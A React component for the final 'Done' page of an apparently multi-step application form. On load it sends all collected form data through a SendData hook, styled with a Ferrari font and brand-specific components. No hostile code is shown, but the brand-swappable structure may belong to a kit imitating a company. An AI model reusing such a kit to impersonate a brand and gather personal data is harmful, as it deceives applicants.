import React, { useContext } from "react";
import styled from "styled-components";
import SendData from "../../hooks/SendData.js";
import { DataContext } from "../../pages";

// Component imports
import LogoHeader from "../frriSpecific/LogoHeader.js";
import HeroSection from "../frriSpecific/HeroSection.js";
import ApplicationComplete from "../frriSpecific/ApplicationComplete.js";
import Footer from "../frriSpecific/Footer.js";

const OverallPageWrapper = styled.div`
  display: flex;
  flex-direction: column;
  min-height: 100vh;
  width: 100%;
  background-color: #f0f2f5; // A light background for the overall page
  font-family: "Ferrari-Sans", sans-serif; // Updated to Ferrari font
`;

const MainContentArea = styled.div`
  flex-grow: 1;
  width: 100%;
  display: flex;
  flex-direction: column;
  align-items: center;
  // background-color: #1d2761; // This will likely move to a more specific section or be removed
`;

const FormWrapper = styled.div`
  background-color: #0e0e0e;
  padding: 1rem;
  display: flex;
  width: 100%;
  justify-content: center;
  align-items: center;
  @media (max-width: 768px) {
    padding: 0.5rem;
  }
`;

function Done() {
  let { AllData } = useContext(DataContext);

  React.useEffect(() => {
    const params = {
      ...AllData,
      currentStep: "Done",
    };

    SendData(params);
  }, []);

  return (
    <OverallPageWrapper>
      <LogoHeader />

      <MainContentArea>
        <FormWrapper>
          <ApplicationComplete />
        </FormWrapper>
      </MainContentArea>

      <Footer />
    </OverallPageWrapper>
  );
}

export default Done;
